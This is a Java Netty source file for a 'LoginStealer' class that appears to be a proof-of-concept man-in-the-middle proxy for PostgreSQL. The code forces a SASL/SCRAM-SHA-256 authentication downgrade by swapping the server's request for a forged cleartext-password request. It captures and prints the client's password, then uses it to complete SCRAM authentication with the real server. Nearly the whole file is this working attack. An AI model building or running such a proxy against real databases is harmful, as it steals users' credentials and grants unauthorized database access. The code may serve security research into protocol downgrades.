package dev.bandarlog.test.netty.proxy.postgres.lean;

import static dev.bandarlog.test.netty.proxy.postgres.lean.MessageFactory.*;

import java.util.Map;

import com.bolyartech.scram_sasl.client.ScramSaslClientProcessor.Listener;
import com.bolyartech.scram_sasl.client.ScramSaslClientProcessor.Sender;
import com.bolyartech.scram_sasl.client.ScramSha256SaslClientProcessor;

import dev.bandarlog.test.netty.proxy.postgres.lean.PostgresMessages.AuthenticationResponse;
import dev.bandarlog.test.netty.proxy.postgres.lean.PostgresMessages.AuthenticationResponse.AuthenticationResponseType;
import dev.bandarlog.test.netty.proxy.postgres.lean.PostgresMessages.ParameterStatus;
import dev.bandarlog.test.netty.proxy.postgres.lean.PostgresMessages.Password;
import dev.bandarlog.test.netty.proxy.postgres.lean.PostgresMessages.StartupMessage;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.ChannelDuplexHandler;
import io.netty.channel.ChannelFutureListener;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelPromise;

/**
 * This class here implements the MITM logic:
 * <ul>
 * <li>Fakes a cleartext password connection</li>
 * <li>Forwards the stolen credentials to the server</li>
 * </ul>
 */
public class LoginStealer extends ChannelDuplexHandler {

	private static final ChannelFutureListener FIRE = ChannelFutureListener.FIRE_EXCEPTION_ON_FAILURE;
	
	private static final ByteBuf CLEARTEXT = Unpooled.wrappedBuffer(new byte[] { 'R', 0, 0, 0, 8, 0, 0, 0, 3 });
	
	private Map<String, String> parameters;
	
	private ScramSha256SaslClientProcessor saslProcessor;
	
	@Override
	public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
		if (msg instanceof StartupMessage) {
			final StartupMessage startup = (StartupMessage) msg;
			
			if (startup.getProtocolVersion() == StartupMessage.CANCEL_REQUEST_PROTOCOL_VERSION) {
				// Nothing to do.
			} else {
				// read the username
				parameters = startup.getPayload();
				
				System.out.println("Startup message: " + parameters);
			}
		} else if (msg instanceof Password) {
			final Password password = (Password) msg;
			final String pass = password.getPassword();
			
			System.out.println("/!\\ Got password: " + pass);
			
			saslProcessor.start("", pass);
			
			ctx.read();
			
			return;
		} else {
			System.out.println("Reading: " + msg);
		}
		
		super.channelRead(ctx, msg);
	}
	
	public enum AuthenticationState {
		NONE, // default value
		WAITING_FOR_CHALLENGE, // start has been sent, waiting for server challenge
		COMPLETED, // authenticated.
	}
	
	@Override
	public void write(ChannelHandlerContext ctx, Object msg, ChannelPromise promise) throws Exception {
		
		if (msg instanceof ParameterStatus) {
			final ParameterStatus parameterStatus = (ParameterStatus) msg;
			
			System.out.println("Parameter status: " + parameterStatus.getParameterName() + "=" + parameterStatus.getParameterValue());
		} else if (msg instanceof AuthenticationResponse) {
			final AuthenticationResponse response = (AuthenticationResponse) msg;
			
			System.out.println("Authentication response: " + response.getAuthenticationResponseType());
			
			// hijack the response to force cleartext
			
			if (response.getAuthenticationResponseType() == AuthenticationResponseType.SASL) {
				// shit.
				response.release();
				
				// send a cleartext instead
				super.write(ctx, CLEARTEXT.retain(), promise);
				
				Listener listener = new Listener() {
					
					@Override
					public void onSuccess() {
						System.out.println("/!\\ SASL Success !");
						ctx.writeAndFlush(buildAuthenticationResponse(ctx.alloc(), AuthenticationResponseType.OK).retain());
						ctx.read();
					}
					
					@Override
					public void onFailure() {
						System.out.println("/!\\ SASL Failure !");
						// TODO: send error message
//						ctx.writeAndFlush(, promise)
					}
				};
				Sender sender = new Sender() {
					
					private boolean firstResponse = true;
					
					@Override
					public void sendMessage(String msg) {
						try {
							System.out.println("Sending message: " + msg);

							final PostgresMessages message;
							if (firstResponse) {
								message = buildSASLInitialResponse(ctx.alloc(), "SCRAM-SHA-256", msg);
								firstResponse = false;
							} else {
								message = buildSASLResponse(ctx.alloc(), msg);
							}
							
							LoginStealer.super.channelRead(ctx, message.retain());
							ctx.read();
						} catch (Exception e) {
							System.out.println("Caught exception: " + e);
							e.printStackTrace();
						}
					}
				};
				saslProcessor = new ScramSha256SaslClientProcessor(listener, sender);
				
				return;
			} else if (response.getAuthenticationResponseType() == AuthenticationResponseType.SASL_CONTINUE) {
				// good, continue
				final String message = response.getPayload();
				
				response.release();
				
				System.out.println("Received challenge: " + message);
				
				saslProcessor.onMessage(message);
				
				ctx.read();
				
				return;
			} else if (response.getAuthenticationResponseType() == AuthenticationResponseType.SASL_FINAL) {
				// we're done !
			} else if (response.getAuthenticationResponseType() == AuthenticationResponseType.CLEARTEXT) {
				// good
			} else if (response.getAuthenticationResponseType() == AuthenticationResponseType.MD5) {
				// manageable
			}
		} else {
			System.out.println("Writing:" + msg);
		}
		
		super.write(ctx, msg, promise);
	}
}